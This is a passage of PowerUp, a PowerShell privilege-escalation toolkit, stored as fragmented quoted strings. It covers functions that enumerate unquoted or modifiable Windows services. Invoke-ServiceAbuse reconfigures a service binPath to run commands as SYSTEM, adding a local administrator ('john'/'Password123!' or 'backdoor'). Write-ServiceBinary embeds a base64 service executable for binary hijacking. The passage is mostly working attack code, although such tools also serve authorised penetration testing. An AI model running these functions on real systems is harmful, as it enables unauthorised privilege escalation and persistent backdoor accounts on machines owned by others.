an','d aren''t quo','ted.

.EXAMP','LE

Get-Unqu','otedService
','
Get a set o','f potentiall','y exploitabl','e services.
','
.OUTPUTS

P','owerUp.Unquo','tedService

','.LINK

https','://github.co','m/rapid7/met','asploit-fram','ework/blob/m','aster/module','s/exploits/w','indows/local','/trusted_ser','vice_path.rb','
#>

    [Di','agnostics.Co','deAnalysis.S','uppressMessa','geAttribute(','''PSShouldPro','cess'', '''')]
','    [OutputT','ype(''PowerUp','.UnquotedSer','vice'')]
    ','[CmdletBindi','ng()]
    Pa','ram()

    #',' find all pa','ths to servi','ce .exe''s th','at have a sp','ace in the p','ath and aren','''t quoted
  ','  $VulnServi','ces = Get-Wm','iObject -Cla','ss win32_ser','vice | Where','-Object {
  ','      $_ -an','d ($Null -ne',' $_.pathname',') -and ($_.p','athname.Trim','() -ne '''') -','and (-not $_','.pathname.St','artsWith("`"','")) -and (-n','ot $_.pathna','me.StartsWit','h("''")) -and',' ($_.pathnam','e.Substring(','0, $_.pathna','me.ToLower()','.IndexOf(''.e','xe'') + 4)) -','match ''.* .*','''
    }

   ',' if ($VulnSe','rvices) {
  ','      ForEac','h ($Service ','in $VulnServ','ices) {

   ','         $Sp','litPathArray',' = $Service.','pathname.Spl','it('' '')
    ','        $Con','catPathArray',' = @()
     ','       for (','$i=0;$i -lt ','$SplitPathAr','ray.Count; $','i++) {
     ','            ','       $Conc','atPathArray ','+= $SplitPat','hArray[0..$i','] -join '' ''
','            ','}

         ','   $Modifiab','leFiles = $C','oncatPathArr','ay | Get-Mod','ifiablePath
','
           ',' $Modifiable','Files | Wher','e-Object {$_',' -and $_.Mod','ifiablePath ','-and ($_.Mod','ifiablePath ','-ne '''')} | F','oreach-Objec','t {
        ','        $Can','Restart = Te','st-ServiceDa','clPermission',' -Permission','Set ''Restart',''' -Name $Ser','vice.name
  ','            ','  $Out = New','-Object PSOb','ject
       ','         $Ou','t | Add-Memb','er Noteprope','rty ''Service','Name'' $Servi','ce.name
    ','            ','$Out | Add-M','ember Notepr','operty ''Path',''' $Service.p','athname
    ','            ','$Out | Add-M','ember Notepr','operty ''Modi','fiablePath'' ','$_
         ','       $Out ','| Add-Member',' Notepropert','y ''StartName',''' $Service.s','tartname
   ','            ',' $Out | Add-','Member Notep','roperty ''Abu','seFunction'' ','"Write-Servi','ceBinary -Na','me ''$($Servi','ce.name)'' -P','ath <HijackP','ath>"
      ','          $O','ut | Add-Mem','ber Noteprop','erty ''CanRes','tart'' ([Bool',']$CanRestart',')
          ','      $Out |',' Add-Member ','Aliaspropert','y Name Servi','ceName
     ','           $','Out.PSObject','.TypeNames.I','nsert(0, ''Po','werUp.Unquot','edService'')
','            ','    $Out
   ','         }
 ','       }
   ',' }
}


funct','ion Get-Modi','fiableServic','eFile {
<#
.','SYNOPSIS

En','umerates all',' services an','d returns vu','lnerable ser','vice files.
','
Author: Wil','l Schroeder ','(@harmj0y)  ','
License: BS','D 3-Clause  ','
Required De','pendencies: ','Test-Service','DaclPermissi','on, Get-Modi','fiablePath  ','

.DESCRIPTI','ON

Enumerat','es all servi','ces by query','ing the WMI ','win32_servic','e class. For',' each servic','e,
it takes ','the pathname',' (aka binPat','h) and passe','s it to Get-','ModifiablePa','th to determ','ine
if the c','urrent user ','has rights t','o modify the',' service bin','ary itself o','r any associ','ated
argumen','ts. If the a','ssociated bi','nary (or any',' configurati','on files) ca','n be overwri','tten,
privil','eges may be ','able to be e','scalated.

.','EXAMPLE

Get','-ModifiableS','erviceFile

','Get a set of',' potentially',' exploitable',' service bin','ares/config ','files.

.OUT','PUTS

PowerU','p.Modifiable','Path
#>

   ',' [Diagnostic','s.CodeAnalys','is.SuppressM','essageAttrib','ute(''PSShoul','dProcess'', ''',''')]
    [Out','putType(''Pow','erUp.Modifia','bleServiceFi','le'')]
    [C','mdletBinding','()]
    Para','m()

    Get','-WMIObject -','Class win32_','service | Wh','ere-Object {','$_ -and $_.p','athname} | F','orEach-Objec','t {

       ',' $ServiceNam','e = $_.name
','        $Ser','vicePath = $','_.pathname
 ','       $Serv','iceStartName',' = $_.startn','ame

       ',' $ServicePat','h | Get-Modi','fiablePath |',' ForEach-Obj','ect {
      ','      $CanRe','start = Test','-ServiceDacl','Permission -','PermissionSe','t ''Restart'' ','-Name $Servi','ceName
     ','       $Out ','= New-Object',' PSObject
  ','          $O','ut | Add-Mem','ber Noteprop','erty ''Servic','eName'' $Serv','iceName
    ','        $Out',' | Add-Membe','r Noteproper','ty ''Path'' $S','ervicePath
 ','           $','Out | Add-Me','mber Notepro','perty ''Modif','iableFile'' $','_.Modifiable','Path
       ','     $Out | ','Add-Member N','oteproperty ','''ModifiableF','ilePermissio','ns'' $_.Permi','ssions
     ','       $Out ','| Add-Member',' Notepropert','y ''Modifiabl','eFileIdentit','yReference'' ','$_.IdentityR','eference
   ','         $Ou','t | Add-Memb','er Noteprope','rty ''StartNa','me'' $Service','StartName
  ','          $O','ut | Add-Mem','ber Noteprop','erty ''AbuseF','unction'' "In','stall-Servic','eBinary -Nam','e ''$ServiceN','ame''"
      ','      $Out |',' Add-Member ','Noteproperty',' ''CanRestart',''' ([Bool]$Ca','nRestart)
  ','          $O','ut | Add-Mem','ber Aliaspro','perty Name S','erviceName
 ','           $','Out.PSObject','.TypeNames.I','nsert(0, ''Po','werUp.Modifi','ableServiceF','ile'')
      ','      $Out
 ','       }
   ',' }
}


funct','ion Get-Modi','fiableServic','e {
<#
.SYNO','PSIS

Enumer','ates all ser','vices and re','turns servic','es for which',' the current',' user can mo','dify the bin','Path.

Autho','r: Will Schr','oeder (@harm','j0y)  
Licen','se: BSD 3-Cl','ause  
Requi','red Dependen','cies: Test-S','erviceDaclPe','rmission, Ge','t-ServiceDet','ail  

.DESC','RIPTION

Enu','merates all ','services usi','ng Get-Servi','ce and uses ','Test-Service','DaclPermissi','on to test i','f
the curren','t user has r','ights to cha','nge the serv','ice configur','ation.

.EXA','MPLE

Get-Mo','difiableServ','ice

Get a s','et of potent','ially exploi','table servic','es.

.OUTPUT','S

PowerUp.M','odifiablePat','h
#>

    [D','iagnostics.C','odeAnalysis.','SuppressMess','ageAttribute','(''PSShouldPr','ocess'', '''')]','
    [Output','Type(''PowerU','p.Modifiable','Service'')]
 ','   [CmdletBi','nding()]
   ',' Param()

  ','  Get-Servic','e | Test-Ser','viceDaclPerm','ission -Perm','issionSet ''C','hangeConfig''',' | ForEach-O','bject {
    ','    $Service','Details = $_',' | Get-Servi','ceDetail
   ','     $CanRes','tart = $_ | ','Test-Service','DaclPermissi','on -Permissi','onSet ''Resta','rt''
        ','$Out = New-O','bject PSObje','ct
        $','Out | Add-Me','mber Notepro','perty ''Servi','ceName'' $Ser','viceDetails.','name
       ',' $Out | Add-','Member Notep','roperty ''Pat','h'' $ServiceD','etails.pathn','ame
        ','$Out | Add-M','ember Notepr','operty ''Star','tName'' $Serv','iceDetails.s','tartname
   ','     $Out | ','Add-Member N','oteproperty ','''AbuseFuncti','on'' "Invoke-','ServiceAbuse',' -Name ''$($S','erviceDetail','s.name)''"
  ','      $Out |',' Add-Member ','Noteproperty',' ''CanRestart',''' ([Bool]$Ca','nRestart)
  ','      $Out |',' Add-Member ','Aliaspropert','y Name Servi','ceName
     ','   $Out.PSOb','ject.TypeNam','es.Insert(0,',' ''PowerUp.Mo','difiableServ','ice'')
      ','  $Out
    }','
}


functio','n Get-Servic','eDetail {
<#','
.SYNOPSIS

','Returns deta','iled informa','tion about a',' specified s','ervice by qu','erying the
W','MI win32_ser','vice class f','or the speci','fied service',' name.

Auth','or: Will Sch','roeder (@har','mj0y)  
Lice','nse: BSD 3-C','lause  
Requ','ired Depende','ncies: None ',' 

.DESCRIPT','ION

Takes a','n array of o','ne or more s','ervice Names',' or ServiceP','rocess.Servi','ceController',' objedts on
','the pipeline',' object retu','rned by Get-','Service, ext','racts out th','e service na','me, queries ','the
WMI win3','2_service cl','ass for the ','specified se','rvice for de','tails like b','inPath, and ','outputs
ever','ything.

.PA','RAMETER Name','

An array o','f one or mor','e service na','mes to query',' information',' for.

.EXAM','PLE

Get-Ser','viceDetail -','Name VulnSVC','

Gets detai','led informat','ion about th','e ''VulnSVC'' ','service.

.E','XAMPLE

Get-','Service Vuln','SVC | Get-Se','rviceDetail
','
Gets detail','ed informati','on about the',' ''VulnSVC'' s','ervice.

.OU','TPUTS

Syste','m.Management','.ManagementO','bject
#>

  ','  [OutputTyp','e(''PowerUp.M','odifiableSer','vice'')]
    ','[CmdletBindi','ng()]
    Pa','ram(
       ',' [Parameter(','Position = 0',', Mandatory ','= $True, Val','ueFromPipeli','ne = $True, ','ValueFromPip','elineByPrope','rtyName = $T','rue)]
      ','  [Alias(''Se','rviceName'')]','
        [St','ring[]]
    ','    [Validat','eNotNullOrEm','pty()]
     ','   $Name
   ',' )

    PROC','ESS {
      ','  ForEach($I','ndividualSer','vice in $Nam','e) {
       ','     $Target','Service = Ge','t-Service -N','ame $Individ','ualService -','ErrorAction ','Stop
       ','     if ($Ta','rgetService)',' {
         ','       Get-W','miObject -Cl','ass win32_se','rvice -Filte','r "Name=''$($','TargetServic','e.Name)''" | ','Where-Object',' {$_} | ForE','ach-Object {','
           ','         try',' {
         ','            ','   $_
      ','            ','  }
        ','            ','catch {
    ','            ','        Writ','e-Verbose "E','rror: $_"
  ','            ','      }
    ','            ','}
          ','  }
        ','}
    }
}


','############','############','############','############','########
#
#',' Service abu','se
#
#######','############','############','############','############','#

function ','Invoke-Servi','ceAbuse {
<#','
.SYNOPSIS

','Abuses a fun','ction the cu','rrent user h','as configura','tion rights ','on in order
','to add a loc','al administr','ator or exec','ute a custom',' command.

A','uthor: Will ','Schroeder (@','harmj0y)  
L','icense: BSD ','3-Clause  
R','equired Depe','ndencies: Ge','t-ServiceDet','ail, Set-Ser','viceBinaryPa','th  

.DESCR','IPTION

Take','s a service ','Name or a Se','rviceProcess','.ServiceCont','roller on th','e pipeline t','hat the curr','ent
user has',' configurati','on modificat','ion rights o','n and execut','es a series ','of automated',' actions to
','execute comm','ands as SYST','EM. First, t','he service i','s enabled if',' it was set ','as disabled ','and the
orig','inal service',' binary path',' and configu','ration state',' are preserv','ed. Then the',' service is ','stopped
and ','the Set-Serv','iceBinaryPat','h function i','s used to se','t the binary',' (binPath) f','or the servi','ce to a
seri','es of comman','ds, the serv','ice is start','ed, stopped,',' and the nex','t command is',' configured.',' After
compl','etion, the o','riginal serv','ice configur','ation is res','tored and a ','custom objec','t is returne','d
that captu','res the serv','ice abused a','nd commands ','run.

.PARAM','ETER Name

A','n array of o','ne or more s','ervice names',' to abuse.

','.PARAMETER U','serName

The',' [domain\]us','ername to ad','d. If not gi','ven, it defa','ults to "joh','n".
Domain u','sers are not',' created, on','ly added to ','the specifie','d localgroup','.

.PARAMETE','R Password

','The password',' to set for ','the added us','er. If not g','iven, it def','aults to "Pa','ssword123!"
','
.PARAMETER ','LocalGroup

','Local group ','name to add ','the user to ','(default of ','''Administrat','ors'').

.PAR','AMETER Crede','ntial

A [Ma','nagement.Aut','omation.PSCr','edential] ob','ject specify','ing the user','/password to',' add.

.PARA','METER Comman','d

Custom co','mmand to exe','cute instead',' of user cre','ation.

.PAR','AMETER Force','

Switch. Fo','rce service ','stopping, ev','en if other ','services are',' dependent.
','
.EXAMPLE

I','nvoke-Servic','eAbuse -Name',' VulnSVC

Ab','uses service',' ''VulnSVC'' t','o add a loca','luser "john"',' with passwo','rd
"Password','123! to the ',' machine and',' local admin','istrator gro','up

.EXAMPLE','

Get-Servic','e VulnSVC | ','Invoke-Servi','ceAbuse

Abu','ses service ','''VulnSVC'' to',' add a local','user "john" ','with passwor','d
"Password1','23! to the  ','machine and ','local admini','strator grou','p

.EXAMPLE
','
Invoke-Serv','iceAbuse -Na','me VulnSVC -','UserName "TE','STLAB\john"
','
Abuses serv','ice ''VulnSVC',''' to add a t','he domain us','er TESTLAB\j','ohn to the
l','ocal adminis','rtators grou','p.

.EXAMPLE','

Invoke-Ser','viceAbuse -N','ame VulnSVC ','-UserName ba','ckdoor -Pass','word passwor','d -LocalGrou','p "Power Use','rs"

Abuses ','service ''Vul','nSVC'' to add',' a localuser',' "backdoor" ','with passwor','d
"password"',' to the  mac','hine and loc','al "Power Us','ers" group

','.EXAMPLE

In','voke-Service','Abuse -Name ','VulnSVC -Com','mand "net ..','."

Abuses s','ervice ''Vuln','SVC'' to exec','ute a custom',' command.

.','OUTPUTS

Pow','erUp.AbusedS','ervice
#>

 ','   [Diagnost','ics.CodeAnal','ysis.Suppres','sMessageAttr','ibute(''PSSho','uldProcess'',',' '''')]
    [D','iagnostics.C','odeAnalysis.','SuppressMess','ageAttribute','(''PSAvoidUsi','ngUserNameAn','dPassWordPar','ams'', '''')]
 ','   [Diagnost','ics.CodeAnal','ysis.Suppres','sMessageAttr','ibute(''PSAvo','idUsingPlain','TextForPassw','ord'', '''')]
 ','   [OutputTy','pe(''PowerUp.','AbusedServic','e'')]
    [Cm','dletBinding(',')]
    Param','(
        [P','arameter(Pos','ition = 0, M','andatory = $','True, ValueF','romPipeline ','= $True, Val','ueFromPipeli','neByProperty','Name = $True',')]
        [','Alias(''Servi','ceName'')]
  ','      [Strin','g[]]
       ',' [ValidateNo','tNullOrEmpty','()]
        ','$Name,

    ','    [Validat','eNotNullOrEm','pty()]
     ','   [String]
','        $Use','rName = ''joh','n'',

       ',' [ValidateNo','tNullOrEmpty','()]
        ','[String]
   ','     $Passwo','rd = ''Passwo','rd123!'',

  ','      [Valid','ateNotNullOr','Empty()]
   ','     [String',']
        $L','ocalGroup = ','''Administrat','ors'',

     ','   [Manageme','nt.Automatio','n.PSCredenti','al]
        ','[Management.','Automation.C','redentialAtt','ribute()]
  ','      $Crede','ntial = [Man','agement.Auto','mation.PSCre','dential]::Em','pty,

      ','  [String]
 ','       [Vali','dateNotNullO','rEmpty()]
  ','      $Comma','nd,

       ',' [Switch]
  ','      $Force','
    )

    ','BEGIN {

   ','     if ($PS','BoundParamet','ers[''Command',''']) {
      ','      $Servi','ceCommands =',' @($Command)','
        }

','        else',' {
         ','   if ($PSBo','undParameter','s[''Credentia','l'']) {
     ','           $','UserNameToAd','d = $Credent','ial.UserName','
           ','     $Passwo','rdToAdd = $C','redential.Ge','tNetworkCred','ential().Pas','sword
      ','      }
    ','        else',' {
         ','       $User','NameToAdd = ','$UserName
  ','            ','  $PasswordT','oAdd = $Pass','word
       ','     }

    ','        if (','$UserNameToA','dd.Contains(','''\'')) {
    ','            ','# only addin','g a domain u','ser to the l','ocal group, ','no user crea','tion
       ','         $Se','rviceCommand','s = @("net l','ocalgroup $L','ocalGroup $U','serNameToAdd',' /add")
    ','        }
  ','          el','se {
       ','         # c','reate a loca','l user and a','dd it to the',' local speci','fied group
 ','            ','   $ServiceC','ommands = @(','"net user $U','serNameToAdd',' $PasswordTo','Add /add", "','net localgro','up $LocalGro','up $UserName','ToAdd /add")','
           ',' }
        }','
    }

    ','PROCESS {

 ','       ForEa','ch($Individu','alService in',' $Name) {

 ','           $','TargetServic','e = Get-Serv','ice -Name $I','ndividualSer','vice -ErrorA','ction Stop
 ','           $','ServiceDetai','ls = $Target','Service | Ge','t-ServiceDet','ail

       ','     $Restor','eDisabled = ','$False
     ','       if ($','ServiceDetai','ls.StartMode',' -match ''Dis','abled'') {
  ','            ','  Write-Verb','ose "Service',' ''$(ServiceD','etails.Name)',''' disabled, ','enabling..."','
           ','     $Target','Service | Se','t-Service -S','tartupType M','anual -Error','Action Stop
','            ','    $Restore','Disabled = $','True
       ','     }

    ','        $Ori','ginalService','Path = $Serv','iceDetails.P','athName
    ','        $Ori','ginalService','State = $Ser','viceDetails.','State

     ','       Write','-Verbose "Se','rvice ''$($Ta','rgetService.','Name)'' origi','nal path: ''$','OriginalServ','icePath''"
  ','          Wr','ite-Verbose ','"Service ''$(','$TargetServi','ce.Name)'' or','iginal state',': ''$Original','ServiceState','''"

        ','    ForEach(','$ServiceComm','and in $Serv','iceCommands)',' {

        ','        if (','$PSBoundPara','meters[''Forc','e'']) {
     ','            ','   $TargetSe','rvice | Stop','-Service -Fo','rce -ErrorAc','tion Stop
  ','            ','  }
        ','        else',' {
         ','           $','TargetServic','e | Stop-Ser','vice -ErrorA','ction Stop
 ','            ','   }

      ','          Wr','ite-Verbose ','"Executing c','ommand ''$Ser','viceCommand''','"
          ','      $Succe','ss = $Target','Service | Se','t-ServiceBin','aryPath -Pat','h "$ServiceC','ommand"

   ','            ',' if (-not $S','uccess) {
  ','            ','      throw ','"Error recon','figuring the',' binary path',' for $($Targ','etService.Na','me)"
       ','         }

','            ','    $TargetS','ervice | Sta','rt-Service -','ErrorAction ','SilentlyCont','inue
       ','         Sta','rt-Sleep -Se','conds 2
    ','        }

 ','           i','f ($PSBoundP','arameters[''F','orce'']) {
  ','            ','  $TargetSer','vice | Stop-','Service -For','ce -ErrorAct','ion Stop
   ','         }
 ','           e','lse {
      ','          $T','argetService',' | Stop-Serv','ice -ErrorAc','tion Stop
  ','          }
','
           ',' Write-Verbo','se "Restorin','g original p','ath to servi','ce ''$($Targe','tService.Nam','e)''"
       ','     Start-S','leep -Second','s 1
        ','    $Success',' = $TargetSe','rvice | Set-','ServiceBinar','yPath -Path ','"$OriginalSe','rvicePath"

','            ','if (-not $Su','ccess) {
   ','            ',' throw "Erro','r restoring ','the original',' binPath for',' $($TargetSe','rvice.Name)"','
           ',' }

        ','    # try to',' restore the',' service to ','whatever the',' service''s o','riginal stat','e was
      ','      if ($R','estoreDisabl','ed) {
      ','          Wr','ite-Verbose ','"Re-disablin','g service ''$','($TargetServ','ice.Name)''"
','            ','    $TargetS','ervice | Set','-Service -St','artupType Di','sabled -Erro','rAction Stop','
           ',' }
         ','   elseif ($','OriginalServ','iceState -eq',' "Paused") {','
           ','     Write-V','erbose "Star','ting and the','n pausing se','rvice ''$($Ta','rgetService.','Name)''"
    ','            ','$TargetServi','ce | Start-S','ervice
     ','           S','tart-Sleep -','Seconds 1
  ','            ','  $TargetSer','vice | Set-S','ervice -Stat','us Paused -E','rrorAction S','top
        ','    }
      ','      elseif',' ($OriginalS','erviceState ','-eq "Stopped','") {
       ','         Wri','te-Verbose "','Leaving serv','ice ''$($Targ','etService.Na','me)'' in stop','ped state"
 ','           }','
           ',' else {
    ','            ','Write-Verbos','e "Restartin','g ''$($Target','Service.Name',')''"
        ','        $Tar','getService |',' Start-Servi','ce
         ','   }

      ','      $Out =',' New-Object ','PSObject
   ','         $Ou','t | Add-Memb','er Noteprope','rty ''Service','Abused'' $Tar','getService.N','ame
        ','    $Out | A','dd-Member No','teproperty ''','Command'' $($','ServiceComma','nds -join '' ','&& '')
      ','      $Out.P','SObject.Type','Names.Insert','(0, ''PowerUp','.AbusedServi','ce'')
       ','     $Out
  ','      }
    ','}
}


functi','on Write-Ser','viceBinary {','
<#
.SYNOPSI','S

Patches i','n the specif','ied command ','to a pre-com','piled C# ser','vice executa','ble and
writ','es the binar','y out to the',' specified S','ervicePath l','ocation.

Au','thor: Will S','chroeder (@h','armj0y)  
Li','cense: BSD 3','-Clause  
Re','quired Depen','dencies: Non','e  

.DESCRI','PTION

Takes',' a pre-compi','led C# servi','ce binary an','d patches in',' the appropr','iate command','s needed
for',' service abu','se. If a -Us','erName/-Pass','word or -Cre','dential is s','pecified, th','e command
pa','tched in cre','ates a local',' user and ad','ds them to t','he specified',' -LocalGroup',', otherwise
','the specifie','d -Command i','s patched in','. The binary',' is then wri','tten out to ','the specifie','d
-ServicePa','th. Either -','Name must be',' specified f','or the servi','ce, or a pro','per object f','rom
Get-Serv','ice must be ','passed on th','e pipeline i','n order to p','atch in the ','appropriate ','service
name',' the binary ','will be runn','ing under.

','.PARAMETER N','ame

The ser','vice name th','e EXE will b','e running un','der.

.PARAM','ETER UserNam','e

The [doma','in\]username',' to add. If ','not given, i','t defaults t','o "john".
Do','main users a','re not creat','ed, only add','ed to the sp','ecified loca','lgroup.

.PA','RAMETER Pass','word

The pa','ssword to se','t for the ad','ded user. If',' not given, ','it defaults ','to "Password','123!"

.PARA','METER LocalG','roup

Local ','group name t','o add the us','er to (defau','lt of ''Admin','istrators'').','

.PARAMETER',' Credential
','
A [Manageme','nt.Automatio','n.PSCredenti','al] object s','pecifying th','e user/passw','ord to add.
','
.PARAMETER ','Command

Cus','tom command ','to execute i','nstead of us','er creation.','

.PARAMETER',' Path

Path ','to write the',' binary out ','to, defaults',' to ''service','.exe'' in the',' local direc','tory.

.EXAM','PLE

Write-S','erviceBinary',' -Name VulnS','VC

Writes a',' service bin','ary to servi','ce.exe in th','e local dire','ctory for Vu','lnSVC that
a','dds a local ','Administrato','r (john/Pass','word123!).

','.EXAMPLE

Ge','t-Service Vu','lnSVC | Writ','e-ServiceBin','ary

Writes ','a service bi','nary to serv','ice.exe in t','he local dir','ectory for V','ulnSVC that
','adds a local',' Administrat','or (john/Pas','sword123!).
','
.EXAMPLE

W','rite-Service','Binary -Name',' VulnSVC -Us','erName ''TEST','LAB\john''

W','rites a serv','ice binary t','o service.ex','e in the loc','al directory',' for VulnSVC',' that adds
T','ESTLAB\john ','to the Admin','istrators lo','cal group.

','.EXAMPLE

Wr','ite-ServiceB','inary -Name ','VulnSVC -Use','rName backdo','or -Password',' Password123','!

Writes a ','service bina','ry to servic','e.exe in the',' local direc','tory for Vul','nSVC that
ad','ds a local A','dministrator',' (backdoor/P','assword123!)','.

.EXAMPLE
','
Write-Servi','ceBinary -Na','me VulnSVC -','Command "net',' ..."

Write','s a service ','binary to se','rvice.exe in',' the local d','irectory for',' VulnSVC tha','t
executes a',' custom comm','and.

.OUTPU','TS

PowerUp.','ServiceBinar','y
#>

    [D','iagnostics.C','odeAnalysis.','SuppressMess','ageAttribute','(''PSShouldPr','ocess'', '''')]','
    [Diagno','stics.CodeAn','alysis.Suppr','essMessageAt','tribute(''PSA','voidUsingUse','rNameAndPass','WordParams'',',' '''')]
    [D','iagnostics.C','odeAnalysis.','SuppressMess','ageAttribute','(''PSAvoidUsi','ngPlainTextF','orPassword'',',' '''')]
    [O','utputType(''P','owerUp.Servi','ceBinary'')]
','    [CmdletB','inding()]
  ','  Param(
   ','     [Parame','ter(Position',' = 0, Mandat','ory = $True,',' ValueFromPi','peline = $Tr','ue, ValueFro','mPipelineByP','ropertyName ','= $True)]
  ','      [Alias','(''ServiceNam','e'')]
       ',' [String]
  ','      [Valid','ateNotNullOr','Empty()]
   ','     $Name,
','
        [St','ring]
      ','  $UserName ','= ''john'',

 ','       [Stri','ng]
        ','$Password = ','''Password123','!'',

       ',' [String]
  ','      $Local','Group = ''Adm','inistrators''',',

        [','Management.A','utomation.PS','Credential]
','        [Man','agement.Auto','mation.Crede','ntialAttribu','te()]
      ','  $Credentia','l = [Managem','ent.Automati','on.PSCredent','ial]::Empty,','

        [S','tring]
     ','   [Validate','NotNullOrEmp','ty()]
      ','  $Command,
','
        [St','ring]
      ','  $Path = "$','(Convert-Pat','h .)\service','.exe"
    )
','
    BEGIN {','
        # t','he raw unpat','ched service',' binary
    ','    $B64Bina','ry = "TVqQAA','MAAAAEAAAA//','8AALgAAAAAAA','AAQAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAgAAAAA4fug','4AtAnNIbgBTM','0hVGhpcyBwcm','9ncmFtIGNhbm','5vdCBiZSBydW','4gaW4gRE9TIG','1vZGUuDQ0KJA','AAAAAAAABQRQ','AATAEDANM1P1','UAAAAAAAAAAO','AAAgELAQsAAE','wAAAAIAAAAAA','AAHmoAAAAgAA','AAgAAAAABAAA','AgAAAAAgAABA','AAAAAAAAAEAA','AAAAAAAADAAA','AAAgAAAAAAAA','IAQIUAABAAAB','AAAAAAEAAAEA','AAAAAAABAAAA','AAAAAAAAAAAM','hpAABTAAAAAI','AAADAFAAAAAA','AAAAAAAAAAAA','AAAAAAAKAAAA','wAAABQaQAAHA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAIA','AACAAAAAAAAA','AAAAAACCAAAE','gAAAAAAAAAAA','AAAC50ZXh0AA','AAJEoAAAAgAA','AATAAAAAIAAA','AAAAAAAAAAAA','AAACAAAGAucn','NyYwAAADAFAA','AAgAAAAAYAAA','BOAAAAAAAAAA','AAAAAAAABAAA','BALnJlbG9jAA','AMAAAAAKAAAA','ACAAAAVAAAAA','AAAAAAAAAAAA','AAQAAAQgAAAA','AAAAAAAAAAAA','AAAAAAagAAAA','AAAEgAAAACAA','UA+CAAAFhIAA','ADAAAABgAABg','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAHoDLBMCew','EAAAQsCwJ7AQ','AABG8RAAAKAg','MoEgAACipyAn','MTAAAKfQEAAA','QCcgEAAHBvFA','AACigVAAAKKj','YCKBYAAAoCKA','IAAAYqAAATMA','IAKAAAAAEAAB','FyRwAAcApyQE','AAcAZvFAAACi','gXAAAKJiDQBw','AAKBgAAAoWKB','kAAAoqBioAAB','MwAwAYAAAAAg','AAEReNAQAAAQ','sHFnMDAAAGog','cKBigaAAAKKk','JTSkIBAAEAAA','AAAAwAAAB2NC','4wLjMwMzE5AA','AAAAUAbAAAAM','QCAAAjfgAAMA','MAAHADAAAjU3','RyaW5ncwAAAA','CgBgAAUEAAAC','NVUwDwRgAAEA','AAACNHVUlEAA','AAAEcAAFgBAA','AjQmxvYgAAAA','AAAAACAAABVx','UCAAkAAAAA+i','UzABYAAAEAAA','AaAAAAAwAAAA','EAAAAGAAAAAg','AAABoAAAAOAA','AAAgAAAAEAAA','ADAAAAAAAKAA','EAAAAAAAYARQ','AvAAoAYQBaAA','4AfgBoAAoA6w','DZAAoAAgHZAA','oAHwHZAAoAPg','HZAAoAVwHZAA','oAcAHZAAoAiw','HZAAoApgHZAA','oA3gG/AQoA8g','G/AQoAAALZAA','oAGQLZAAoAUA','I2AgoAfAJpAk','cAkAIAAAoAvw','KfAgoA3wKfAg','oA/QJaAA4ACQ','NoAAoAEwNaAA','4ALwNpAgoATg','M9AwoAWwNaAA','AAAAABAAAAAA','ABAAEAAQAQAB','YAHwAFAAEAAQ','CAARAAJwAfAA','kAAgAGAAEAiQ','ATAFAgAAAAAM','QAlAAXAAEAby','AAAAAAgQCcAB','wAAgCMIAAAAA','CGGLAAHAACAJ','wgAAAAAMQAtg','AgAAIA0CAAAA','AAxAC+ABwAAw','DUIAAAAACRAM','UAJgADAAAAAQ','DKAAAAAQDUAC','EAsAAqACkAsA','AqADEAsAAqAD','kAsAAqAEEAsA','AqAEkAsAAqAF','EAsAAqAFkAsA','AqAGEAsAAXAG','kAsAAqAHEAsA','AqAHkAsAAqAI','EAsAAqAIkAsA','AvAJkAsAA1AK','EAsAAcAKkAlA','AcAAkAlAAXAL','EAsAAcALkAGg','M6AAkAHwMqAA','kAsAAcAMEANw','M+AMkAVQNFAN','EAZwNFAAkAbA','NOAC4ACwBeAC','4AEwBrAC4AGw','BrAC4AIwBrAC','4AKwBeAC4AMw','BxAC4AOwBrAC','4ASwBrAC4AUw','CJAC4AYwCzAC','4AawDAAC4Acw','AmAS4AewAvAS','4AgwA4AUoAVQ','AEgAAAAQAAAA','AAAAAAAAAAAA','AfAAAABAAAAA','AAAAAAAAAAAQ','AvAAAAAAAEAA','AAAAAAAAAAAA','AKAFEAAAAAAA','QAAAAAAAAAAA','AAAAoAWgAAAA','AAAAAAAAA8TW','9kdWxlPgBVcG','RhdGVyLmV4ZQ','BTZXJ2aWNlMQ','BVcGRhdGVyAF','Byb2dyYW0AU3','lzdGVtLlNlcn','ZpY2VQcm9jZX','NzAFNlcnZpY2','VCYXNlAG1zY2','9ybGliAFN5c3','RlbQBPYmplY3','QAU3lzdGVtLk','NvbXBvbmVudE','1vZGVsAElDb2','50YWluZXIAY2','9tcG9uZW50cw','BEaXNwb3NlAE','luaXRpYWxpem','VDb21wb25lbn','QALmN0b3IAT2','5TdGFydABPbl','N0b3AATWFpbg','BkaXNwb3Npbm','cAYXJncwBTeX','N0ZW0uUmVmbG','VjdGlvbgBBc3','NlbWJseVRpdG','xlQXR0cmlidX','RlAEFzc2VtYm','x5RGVzY3JpcH','Rpb25BdHRyaW','J1dGUAQXNzZW','1ibHlDb25maW','d1cmF0aW9uQX','R0cmlidXRlAE','Fzc2VtYmx5Q2','9tcGFueUF0dH','JpYnV0ZQBBc3','NlbWJseVByb2','R1Y3RBdHRyaW','J1dGUAQXNzZW','1ibHlDb3B5cm','lnaHRBdHRyaW','J1dGUAQXNzZW','1ibHlUcmFkZW','1hcmtBdHRyaW','J1dGUAQXNzZW','1ibHlDdWx0dX','JlQXR0cmlidX','RlAFN5c3RlbS','5SdW50aW1lLk','ludGVyb3BTZX','J2aWNlcwBDb2','1WaXNpYmxlQX','R0cmlidXRlAE','d1aWRBdHRyaW','J1dGUAQXNzZW','1ibHlWZXJzaW','9uQXR0cmlidX','RlAEFzc2VtYm','x5RmlsZVZlcn','Npb25BdHRyaW','J1dGUAU3lzdG','VtLlJ1bnRpbW','UuVmVyc2lvbm','luZwBUYXJnZX','RGcmFtZXdvcm','tBdHRyaWJ1dG','UAU3lzdGVtLk','RpYWdub3N0aW','NzAERlYnVnZ2','FibGVBdHRyaW','J1dGUARGVidW','dnaW5nTW9kZX','MAU3lzdGVtLl','J1bnRpbWUuQ2','9tcGlsZXJTZX','J2aWNlcwBDb2','1waWxhdGlvbl','JlbGF4YXRpb2','5zQXR0cmlidX','RlAFJ1bnRpbW','VDb21wYXRpYm','lsaXR5QXR0cm','lidXRlAElEaX','Nwb3NhYmxlAE','NvbnRhaW5lcg','BTdHJpbmcAVH','JpbQBzZXRfU2','VydmljZU5hbW','UAUHJvY